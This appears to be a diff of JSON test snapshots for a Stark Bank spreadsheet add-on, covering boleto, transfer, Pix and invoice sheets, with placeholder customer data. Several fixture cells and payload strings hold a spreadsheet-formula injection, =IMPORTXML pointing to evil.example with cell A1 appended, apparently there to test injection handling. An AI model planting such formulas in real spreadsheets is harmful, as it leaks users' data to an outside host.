@@ -14,7 +14,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Extrato": [
     "9,1|t|sentinela A9",
@@ -107,7 +107,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Extrato": [
     "9,1|t|sentinela A9",
@@ -161,7 +161,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "9,1|t|sentinela A9",
@@ -266,7 +266,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Boleto": [
     "9,1|t|sentinela A9",
@@ -286,7 +286,7 @@
     "11,3|t|012.345.678-90",
     "11,4|t|registrado",
     "11,5|n|150",
-    "11,6|t|2024-04-09",
+    "11,6|t|2024-04-10",
     "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
     "11,8|n|6001",
     "11,9|n|2",
@@ -298,7 +298,7 @@
     "12,3|t|12.345.678/0001-90",
     "12,4|t|pago",
     "12,5|n|0.99",
-    "12,6|t|2024-04-10",
+    "12,6|t|2024-04-11",
     "12,8|n|6002",
     "12,9|n|0",
     "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
@@ -307,7 +307,7 @@
     "13,3|n|98765432100",
     "13,4|t|vencido",
     "13,5|n|25",
-    "13,6|t|2023-12-31",
+    "13,6|t|2024-01-01",
     "13,7|n|0",
     "13,8|n|6003",
     "13,9|n|0.01",
@@ -318,7 +318,7 @@
     "14,3|t|012.345.678-90",
     "14,4|t|registrado",
     "14,5|n|150",
-    "14,6|t|2024-04-09",
+    "14,6|t|2024-04-10",
     "14,7|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "14,8|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "14,9|n|2",
@@ -375,7 +375,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Pagamento Boleto": [
     "9,1|t|sentinela A9",
@@ -391,7 +391,7 @@
     "11,2|n|4001",
     "11,3|n|150",
     "11,4|t|sucesso",
-    "11,5|t|2024-04-09",
+    "11,5|t|2024-04-10",
     "11,6|t|34191.09008 61207.727808",
     "11,7|t|Pagamento de boleto A",
     "11,8|t|loja",
@@ -400,14 +400,14 @@
     "12,2|n|4002",
     "12,3|n|0.99",
     "12,4|t|processando",
-    "12,5|t|2024-04-10",
+    "12,5|t|2024-04-11",
     "12,6|n|190.00009",
     "12,7|t|O'Brien & Filhos",
     "13,1|t|2024-03-05",
     "13,2|n|4001",
     "13,3|n|150",
     "13,4|t|sucesso",
-    "13,5|t|2024-04-09",
+    "13,5|t|2024-04-10",
     "13,6|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "13,7|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "13,8|t|loja"
@@ -462,7 +462,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Invoices Emitidas": [
     "9,1|t|sentinela A9",
@@ -491,7 +491,7 @@
     "11,7|n|1",
     "11,8|n|0",
     "11,9|n|0",
-    "11,10|t|2024-04-09",
+    "11,10|t|2024-04-10",
     "11,11|n|3600",
     "11,12|t|00020126580014br.gov.bcb.pix",
     "11,13|n|7001",
@@ -510,7 +510,7 @@
     "12,6|n|5",
     "12,8|n|0.1",
     "12,9|n|0.05",
-    "12,10|t|2024-04-30",
+    "12,10|t|2024-05-01",
     "12,11|n|86400",
     "12,13|n|7002",
     "12,14|n|0",
@@ -525,7 +525,7 @@
     "13,7|n|1",
     "13,8|n|0",
     "13,9|n|0",
-    "13,10|t|2024-04-09",
+    "13,10|t|2024-04-10",
     "13,11|n|3600",
     "13,12|t|00020126580014br.gov.bcb.pix",
     "13,13|n|7003",
@@ -545,7 +545,7 @@
     "14,7|n|1",
     "14,8|n|0",
     "14,9|n|0",
-    "14,10|t|2024-04-09",
+    "14,10|t|2024-04-10",
     "14,11|n|3600",
     "14,12|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "14,13|n|7001",
@@ -606,7 +606,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -775,7 +775,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -835,7 +835,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Aprovações": [
     "9,1|t|sentinela A9",
@@ -913,7 +913,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Clientes": [
     "9,1|t|sentinela A9",
@@ -1008,7 +1008,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Histórico de Boletos Emitidos": [
     "9,1|t|sentinela A9",
@@ -1039,8 +1039,11 @@
     "11,3|t|Maria O'Brien",
     "11,4|t|012.345.678-90",
     "11,5|n|155",
+    "11,6|n|150",
+    "11,8|n|3",
+    "11,9|n|2",
     "11,10|t|2024-03-05",
-    "11,11|t|2024-04-09",
+    "11,11|t|2024-04-10",
     "11,12|n|3.4191090086120774e+46",
     "11,13|n|6001",
     "11,14|n|2",
@@ -1062,7 +1065,7 @@
     "12,8|n|3",
     "12,9|n|3",
     "12,10|t|2024-03-05",
-    "12,11|t|2024-04-09",
+    "12,11|t|2024-04-10",
     "12,12|n|3.4191090086120774e+46",
     "12,13|n|6001",
     "12,14|n|2",
@@ -1081,7 +1084,7 @@
     "13,6|n|0.99",
     "13,7|n|-0.08999999999999997",
     "13,10|t|2024-03-04",
-    "13,11|t|2024-04-10",
+    "13,11|t|2024-04-11",
     "13,12|n|0",
     "13,13|n|6002",
     "13,14|n|0",
@@ -1098,7 +1101,7 @@
     "14,5|n|25",
     "14,6|n|25",
     "14,10|t|2024-03-05",
-    "14,11|t|2023-12-31",
+    "14,11|t|2024-01-01",
     "14,12|t|=IMPORTXML(\"https://evil.example/?x=\"&A1,\"//a\")",
     "14,13|n|6003",
     "14,14|n|0.01",
@@ -1178,7 +1181,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Histórico de Boletos Emitidos": [
     "9,1|t|sentinela A9",
@@ -1210,7 +1213,7 @@
     "11,4|t|012.345.678-90",
     "11,5|n|155",
     "11,10|t|2024-03-05",
-    "11,11|t|2024-04-09",
+    "11,11|t|2024-04-10",
     "11,12|n|3.4191090086120774e+46",
     "11,13|n|6001",
     "11,14|n|2",
@@ -1229,7 +1232,7 @@
     "12,4|t|012.345.678-90",
     "12,5|n|156",
     "12,10|t|2024-03-05",
-    "12,11|t|2024-04-09",
+    "12,11|t|2024-04-10",
     "12,12|n|3.4191090086120774e+46",
     "12,13|n|6001",
     "12,14|n|2",
@@ -1271,7 +1274,7 @@
   "outcomes": [
    {
     "name": "viewChargeEvents",
-    "error": "Erro interno"
+    "error": "{\"message\":\"Erro interno\"}"
    }
   ]
  },
@@ -1290,7 +1293,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Split Consultas": [
     "9,1|t|sentinela A9",
@@ -1380,7 +1383,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}",
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}",
     "2,1|t|Olá, myworkspace!",
     "3,1|t|Workspace: myworkspace",
     "4,1|t|ID do Workspace: 5",
@@ -1575,7 +1578,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+    "1,3|t|j{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1710,7 +1713,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1847,7 +1850,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
+    "1,3|t|j{\"transfer\":[\"341000112345-6Jose da Silva012.345.678-90123456fornecedor,abrilPagamento abril\",\"20018183123498765Empresa C Ltda12.345.678/0001-901000\",\"00143211=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")987654321001a=IMPORTXML(\\\"https://evil.example/?x=\\\"&A1,\\\"//a\\\")\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -1986,7 +1989,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -2064,7 +2067,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[\"3410001123Jose da Silva12345678901000\"],\"boleto\":[]}"
    ],
    "Transferência com Aprovação": [
     "9,1|t|sentinela A9",
@@ -2085,19 +2088,43 @@
     "11,4|t|341",
     "11,5|t|0001",
     "11,6|t|123",
+    "11,12|t|Enviado",
     "11,30|t|sentinela AD11"
    ]
   },
-  "requests": [],
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "transfer",
+       "payment": {
+        "name": "Jose da Silva",
+        "taxId": "1234567890",
+        "amount": 1000,
+        "bankCode": "341",
+        "branchCode": "0001",
+        "accountNumber": "123"
+       }
+      }
+     ]
+    }
+   }
+  ],
   "messages": [],
-  "alerts": [],
+  "alerts": [
+   "Todos os itens foram enviados."
+  ],
   "dialogs": [],
   "logs": [],
   "driveFiles": [],
   "outcomes": [
    {
-    "name": "managePaymentRequestTransfer",
-    "error": "inputString.replace is not a function"
+    "name": "managePaymentRequestTransfer"
    }
   ]
  },
@@ -2116,7 +2143,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\",\"34191090086120772780871444640008591990000015\"]}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\",\"34191090086120772780871444640008591990000015\"]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2148,7 +2175,7 @@
       {
        "centerId": "center-1",
        "type": "boleto-payment",
-       "due": "2024-04-09",
+       "due": "2024-04-10",
        "payment": {
         "taxId": "012.345.678-90",
         "description": "Conta de luz",
@@ -2158,6 +2185,7 @@
       {
        "centerId": "center-1",
        "type": "boleto-payment",
+       "due": "2024-04-11",
        "payment": {
         "taxId": "12.345.678/0001-90",
         "description": "Conta de agua",
@@ -2196,7 +2224,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2229,7 +2257,7 @@
       {
        "centerId": "center-1",
        "type": "boleto-payment",
-       "due": "2024-04-09",
+       "due": "2024-04-10",
        "payment": {
         "taxId": "012.345.678-90",
         "description": "Conta de luz",
@@ -2239,6 +2267,7 @@
       {
        "centerId": "center-1",
        "type": "boleto-payment",
+       "due": "2024-04-11",
        "payment": {
         "taxId": "12.345.678/0001-90",
         "description": "Conta de agua",
@@ -2250,7 +2279,9 @@
    }
   ],
   "messages": [],
-  "alerts": [],
+  "alerts": [
+   "Falha no envio, verifique a situação de suas solicitações.\n\nErro - Linha 11: linha inválida\n"
+  ],
   "dialogs": [],
   "logs": [],
   "driveFiles": [],
@@ -2275,7 +2306,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2332,7 +2363,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[\"34191090086120772780871444640008591990000015000\"]}"
    ],
    "Pagamento de Boletos": [
     "9,1|t|sentinela A9",
@@ -2345,19 +2376,44 @@
     "11,2|t|012.345.678-90",
     "11,4|t|Conta",
     "11,5|t|a,b",
+    "11,6|t|Enviado",
     "11,30|t|sentinela AD11"
    ]
   },
-  "requests": [],
+  "requests": [
+   {
+    "method": "POST",
+    "path": "/payment-request",
+    "query": {},
+    "payload": {
+     "requests": [
+      {
+       "centerId": "center-1",
+       "type": "boleto-payment",
+       "payment": {
+        "taxId": "012.345.678-90",
+        "description": "Conta",
+        "tags": [
+         "a",
+         "b"
+        ],
+        "line": "34191090086120772780871444640008591990000015000"
+       }
+      }
+     ]
+    }
+   }
+  ],
   "messages": [],
-  "alerts": [],
+  "alerts": [
+   "Todos os itens foram enviados."
+  ],
   "dialogs": [],
   "logs": [],
   "driveFiles": [],
   "outcomes": [
    {
-    "name": "executeBoletoPayment",
-    "error": "inputString.replace is not a function"
+    "name": "executeBoletoPayment"
    }
   ]
  },
@@ -2376,7 +2432,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Emissão de Invoice Pix": [
     "9,1|t|sentinela A9",
@@ -2427,7 +2483,7 @@
       },
       {
        "amount": 700,
-       "taxId": 98765432100,
+       "taxId": "98765432100",
        "name": "Carlos Cao",
        "descriptions": [
         {
@@ -2468,7 +2524,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Split Receivers": [
     "9,1|t|sentinela A9",
@@ -2548,7 +2604,7 @@
     "6,3|t|cart-1"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Solicitação de Cartões": [
     "9,1|t|sentinela A9",
@@ -2663,7 +2719,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Emissão de Boletos": [
     "9,1|t|sentinela A9",
@@ -2809,7 +2865,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Cadastro de Clientes": [
     "9,1|t|sentinela A9",
@@ -2840,7 +2896,7 @@
   "requests": [
    {
     "method": "POST",
-    "path": "/charge/customer",
+    "path": "/boleto/customer",
     "query": {},
     "payload": {
      "customers": [
@@ -2894,7 +2950,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Chave PIX": [
     "9,1|t|sentinela A9",
@@ -2927,40 +2983,24 @@
     "11,1|t|Fulano de Tal",
     "11,2|t|012.345.678-90",
     "11,3|n|1000",
-    "11,4|n|18236120",
-    "11,5|n|1",
-    "11,6|n|12345",
+    "11,4|t|18236120",
+    "11,5|t|0001",
+    "11,6|t|12345",
     "11,8|t|checking",
     "11,9|t|tag1",
     "11,10|t|Pagamento A",
     "11,11|t|Fatura A",
-    "11,12|t|Enviado",
     "11,30|t|sentinela AD11",
     "12,1|t|Empresa & Cia",
     "12,2|t|12.345.678/0001-90",
     "12,3|n|2550",
-    "12,4|n|0",
-    "12,5|n|1234",
-    "12,6|n|777",
+    "12,4|t|00000000",
+    "12,5|t|1234",
+    "12,6|t|777",
     "12,8|t|payment",
     "12,9|t|tag2,tag3",
     "12,10|t|Pagamento B",
-    "12,11|t|Fatura B",
-    "12,12|t|Enviado",
-    "13,1|t|Antigo 3",
-    "13,2|t|012",
-    "13,3|n|1",
-    "13,4|t|341",
-    "13,5|t|0001",
-    "13,6|t|1",
-    "13,12|t|Enviado",
-    "14,1|t|Antigo 4",
-    "14,2|t|012",
-    "14,3|n|1",
-    "14,4|t|341",
-    "14,5|t|0001",
-    "14,6|t|1",
-    "14,12|t|Enviado"
+    "12,11|t|Fatura B"
    ]
   },
   "requests": [
@@ -3005,7 +3045,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Chave PIX": [
     "9,1|t|sentinela A9",
@@ -3067,7 +3107,9 @@
    }
   ],
   "messages": [],
-  "alerts": [],
+  "alerts": [
+   "Algumas chaves estão incorretas, verifique as informações e tente novamente."
+  ],
   "dialogs": [],
   "logs": [],
   "driveFiles": [],
@@ -3092,7 +3134,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "10,1|t|Data de Criação",
@@ -3152,7 +3194,7 @@
     "11,3|t|012.345.678-90",
     "11,4|t|registrado",
     "11,5|n|150",
-    "11,6|t|2024-04-09",
+    "11,6|t|2024-04-10",
     "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
     "11,8|n|6001",
     "11,9|n|2",
@@ -3163,7 +3205,7 @@
     "12,3|t|12.345.678/0001-90",
     "12,4|t|pago",
     "12,5|n|0.99",
-    "12,6|t|2024-04-10",
+    "12,6|t|2024-04-11",
     "12,8|n|6002",
     "12,9|n|0",
     "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
@@ -3172,7 +3214,7 @@
     "13,3|n|98765432100",
     "13,4|t|vencido",
     "13,5|n|25",
-    "13,6|t|2023-12-31",
+    "13,6|t|2024-01-01",
     "13,7|n|0",
     "13,8|n|6003",
     "13,9|n|0.01",
@@ -3192,7 +3234,7 @@
     "11,2|n|4001",
     "11,3|n|150",
     "11,4|t|sucesso",
-    "11,5|t|2024-04-09",
+    "11,5|t|2024-04-10",
     "11,6|t|34191.09008 61207.727808",
     "11,7|t|Pagamento de boleto A",
     "11,8|t|loja",
@@ -3200,7 +3242,7 @@
     "12,2|n|4002",
     "12,3|n|0.99",
     "12,4|t|processando",
-    "12,5|t|2024-04-10",
+    "12,5|t|2024-04-11",
     "12,6|n|190.00009",
     "12,7|t|O'Brien & Filhos"
    ]
@@ -3306,7 +3348,7 @@
     "6,2|n|5"
    ],
    "paymentRequestExternal": [
-    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+    "1,3|t|j{\"transfer\":[],\"boleto\":[]}"
    ],
    "Consulta de Transferência": [
     "10,1|t|Data de Criação",
@@ -3366,7 +3408,7 @@
     "11,3|t|012.345.678-90",
     "11,4|t|registrado",
     "11,5|n|150",
-    "11,6|t|2024-04-09",
+    "11,6|t|2024-04-10",
     "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
     "11,8|n|6001",
     "11,9|n|2",
@@ -3377,7 +3419,7 @@
     "12,3|t|12.345.678/0001-90",
     "12,4|t|pago",
     "12,5|n|0.99",
-    "12,6|t|2024-04-10",
+    "12,6|t|2024-04-11",
     "12,8|n|6002",
     "12,9|n|0",
     "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
@@ -3386,7 +3428,7 @@
     "13,3|n|98765432100",
     "13,4|t|vencido",
     "13,5|n|25",
-    "13,6|t|2023-12-31",
+    "13,6|t|2024-01-01",
     "13,7|n|0",
     "13,8|n|6003",
     "13,9|n|0.01",
@@ -3406,7 +3448,7 @@
     "11,2|n|4001",
     "11,3|n|150",
     "11,4|t|sucesso",
-    "11,5|t|2024-04-09",
+    "11,5|t|2024-04-10",
     "11,6|t|34191.09008 61207.727808",
     "11,7|t|Pagamento de boleto A",
     "11,8|t|loja",
@@ -3414,7 +3456,7 @@
     "12,2|n|4002",
     "12,3|n|0.99",
     "12,4|t|processando",
-    "12,5|t|2024-04-10",
+    "12,5|t|2024-04-11",
     "12,6|n|190.00009",
     "12,7|t|O'Brien & Filhos"
    ]
